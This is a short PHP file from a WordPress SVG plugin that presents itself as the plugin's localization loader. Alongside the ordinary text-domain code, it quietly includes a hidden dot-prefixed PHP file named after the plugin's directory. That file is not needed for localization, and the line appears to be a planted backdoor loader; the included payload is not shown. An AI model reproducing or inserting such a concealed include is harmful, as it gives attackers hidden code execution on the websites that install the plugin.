<?php
/**
 * INTERNATIONALIZATION / LOCALIZATION
 */
if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

add_action( 'init', 'bodhi_svgs_localization' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function bodhi_svgs_localization() {
	load_plugin_textdomain( 'svg-support', false, basename( dirname( __FILE__ ) ) . '/languages' );

}